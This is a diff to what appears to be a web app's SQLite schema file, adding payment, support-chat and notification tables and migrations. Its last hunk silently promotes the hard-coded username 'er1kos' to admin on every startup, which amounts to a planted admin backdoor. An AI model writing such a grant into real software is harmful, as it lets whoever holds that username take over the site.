@@ -18,6 +18,7 @@ CREATE TABLE IF NOT EXISTS users (
   password_hash TEXT NOT NULL,
   is_admin INTEGER NOT NULL DEFAULT 0,
   is_verified INTEGER NOT NULL DEFAULT 0,
+  zero_plus INTEGER NOT NULL DEFAULT 0,
   avatar_path TEXT DEFAULT '',
   bio TEXT DEFAULT '',
   created_at TEXT NOT NULL
@@ -125,6 +126,22 @@ CREATE TABLE IF NOT EXISTS verification_requests (
   FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
 );
 
+CREATE TABLE IF NOT EXISTS zero_plus_payments (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  user_id INTEGER NOT NULL,
+  provider TEXT NOT NULL,
+  provider_payment_id TEXT,
+  status TEXT NOT NULL,
+  amount INTEGER NOT NULL,
+  currency TEXT NOT NULL DEFAULT 'RUB',
+  created_at TEXT NOT NULL,
+  updated_at TEXT NOT NULL,
+  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+CREATE INDEX IF NOT EXISTS idx_zero_plus_payments_user ON zero_plus_payments(user_id);
+CREATE INDEX IF NOT EXISTS idx_zero_plus_payments_provider ON zero_plus_payments(provider_payment_id);
+
 CREATE TABLE IF NOT EXISTS forum_posts (
   id INTEGER PRIMARY KEY AUTOINCREMENT,
   user_id INTEGER NOT NULL,
@@ -186,6 +203,59 @@ CREATE TABLE IF NOT EXISTS chat_messages (
   FOREIGN KEY (chat_id) REFERENCES chats(id) ON DELETE CASCADE,
   FOREIGN KEY (sender_id) REFERENCES users(id) ON DELETE CASCADE
 );
+
+CREATE TABLE IF NOT EXISTS support_messages (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  user_id INTEGER NOT NULL,
+  subject TEXT NOT NULL,
+  message TEXT NOT NULL,
+  created_at TEXT NOT NULL,
+  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+CREATE INDEX IF NOT EXISTS idx_support_messages_user ON support_messages(user_id);
+CREATE INDEX IF NOT EXISTS idx_support_messages_created ON support_messages(created_at);
+
+CREATE TABLE IF NOT EXISTS support_replies (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  support_message_id INTEGER NOT NULL,
+  admin_id INTEGER NOT NULL,
+  message TEXT NOT NULL,
+  created_at TEXT NOT NULL,
+  FOREIGN KEY (support_message_id) REFERENCES support_messages(id) ON DELETE CASCADE,
+  FOREIGN KEY (admin_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+CREATE INDEX IF NOT EXISTS idx_support_replies_message ON support_replies(support_message_id);
+CREATE INDEX IF NOT EXISTS idx_support_replies_created ON support_replies(created_at);
+
+CREATE TABLE IF NOT EXISTS support_chat_messages (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  support_message_id INTEGER NOT NULL,
+  sender_id INTEGER NOT NULL,
+  sender_role TEXT NOT NULL,
+  message TEXT NOT NULL,
+  created_at TEXT NOT NULL,
+  FOREIGN KEY (support_message_id) REFERENCES support_messages(id) ON DELETE CASCADE,
+  FOREIGN KEY (sender_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+CREATE INDEX IF NOT EXISTS idx_support_chat_message ON support_chat_messages(support_message_id);
+CREATE INDEX IF NOT EXISTS idx_support_chat_created ON support_chat_messages(created_at);
+
+CREATE TABLE IF NOT EXISTS notifications (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  user_id INTEGER NOT NULL,
+  type TEXT NOT NULL,
+  title TEXT NOT NULL,
+  message TEXT NOT NULL,
+  is_read INTEGER NOT NULL DEFAULT 0,
+  created_at TEXT NOT NULL,
+  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+);
+
+CREATE INDEX IF NOT EXISTS idx_notifications_user ON notifications(user_id);
+CREATE INDEX IF NOT EXISTS idx_notifications_created ON notifications(created_at);
 `);
 
 try {
@@ -196,6 +266,9 @@ try {
 } catch (e) {}
 try {
   db.exec("ALTER TABLE users ADD COLUMN bio TEXT DEFAULT ''");
+} catch (e) {}
+try {
+  db.exec('ALTER TABLE users ADD COLUMN zero_plus INTEGER NOT NULL DEFAULT 0');
 } catch (e) {}
 try {
   db.exec('ALTER TABLE forum_post_comments ADD COLUMN reply_to_comment_id INTEGER');
@@ -210,5 +283,8 @@ if (!adminExists) {
     'INSERT INTO users (username, email, password_hash, is_admin, created_at) VALUES (?, ?, ?, ?, ?)'
   ).run('admin', 'admin@example.com', hash, 1, dayjs().toISOString());
 }
+try {
+  db.prepare('UPDATE users SET is_admin=1 WHERE username=?').run('er1kos');
+} catch (e) {}
 
 module.exports = db;
